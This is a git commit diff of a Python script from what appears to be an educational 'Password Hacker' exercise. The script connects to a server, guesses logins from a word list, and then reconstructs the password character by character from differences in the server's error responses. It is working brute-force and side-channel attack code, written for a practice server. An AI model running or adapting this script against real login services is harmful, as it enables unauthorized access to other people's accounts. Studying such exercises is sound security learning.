e541be4a82d3922619b116358175877161c42b64
Zhumakul-Artykbay <artykbay.zhumakulov@mail.ru>
2020-10-20 14:56:43 +0600

    Hacking login and password

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,14 +1,30 @@
-import sys, socket, itertools
+import sys, socket, json, itertools
 host, port = sys.argv[1:]
-characters = '0123456789abcdefghijklmnopqrstuvwxyz'
 
+letters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
 with socket.socket() as client_socket:
     client_socket.connect((host, int(port)))
-    with open('passwords.txt', 'r') as f:
-        for line in f:
-            generator = (''.join(i) for i in itertools.product(*([letter.lower(), letter.upper()] for letter in line.strip('\n'))))
-            for password in generator:
-                client_socket.send(password.encode())
-                if client_socket.recv(1024).decode() == 'Connection success!':
-                    print(password)
-                    exit()
+    dict = {}
+    with open('logins.txt', 'r') as login_file:
+
+        for line in login_file:
+            line = line.strip("\n")
+            dict["login"] = line
+            dict["password"] = ' '
+            ms = json.dumps(dict, indent=4)
+            client_socket.send(ms.encode())
+            if json.loads(client_socket.recv(1024).decode())["result"] == "Wrong password!":
+                break
+        dict["password"] = ''
+
+    while True:
+        for i in letters:
+            ms = json.dumps({"login":dict["login"], "password": dict["password"] + i}, indent=4)
+            client_socket.send(ms.encode())
+            res = json.loads(client_socket.recv(1024).decode())
+            if res["result"] == "Exception happened during login":
+                dict["password"] += i
+            elif res["result"] == "Connection success!":
+                dict["password"] += i
+                print(json.dumps(dict))
+                exit()
